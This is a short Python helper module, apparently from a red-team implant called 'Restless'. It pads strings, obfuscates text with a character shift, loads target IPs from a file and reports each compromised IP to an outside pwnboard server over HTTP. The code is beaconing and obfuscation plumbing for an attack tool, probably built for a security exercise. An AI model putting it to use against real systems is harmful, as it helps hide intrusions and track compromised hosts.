"""
Common functions

Author's website: Mohad.red
"""

from Config import *
import requests



def fix(string,fixNumber):
    l = fixNumber - len(string)
    string = string + ' '* l
    return string

def shift(data, shift, sender = True):
    newDate = ""
    for c in data:
        n = int(ord(c))
        #print(n)
        if n > 30:
            strNumber = chr(int(ord(c) + shift))
            newDate += strNumber
        if n > 0 and n < 30:
            newDate += '\r\n'
    if sender:
        data = IDentifier + newDate
    else:
        data = newDate
    return data


def loadIPs():
    try:
        for line in open('ips.conf'):
            ip = line.strip()
            listOfIPs.append(ip)
    except:
        if debug:
            print("loadIPs() has failed")
        pass



"""
Basic python3 function that sends an update to the pwnboard
"""

def sendUpdate(ip, name="Restless"):
    host = "http://logs.pwnboard.win:8080/generic"
    data = {'ip': ip, 'type': name}
    try:
        req = requests.post(host, json=data, timeout=3)
        print(req.text)
        return True
    except Exception as E:
        print(E)
        return False
